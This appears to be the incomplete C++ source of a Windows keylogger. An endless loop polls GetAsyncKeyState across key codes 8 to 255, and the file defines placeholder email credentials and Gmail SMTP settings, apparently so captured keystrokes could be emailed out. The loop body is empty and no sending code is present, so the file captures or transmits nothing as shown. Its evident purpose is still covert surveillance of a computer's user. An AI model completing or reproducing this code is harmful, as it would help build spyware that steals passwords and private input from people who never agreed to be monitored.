//c++

#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define EMAIL "e-mail" 
#define PASSWORD "parola"
#define SMTP_SERVER "smtp.gmail.com" 
#define SMTP_PORT 587 

using namespace std;

int main()
{


    while(true)
    {
        for(int i=8;i<=255;i++)
        {
            if(GetAsyncKeyState(i) == -32767)
            {

            }
        }
    }

    return 0;
}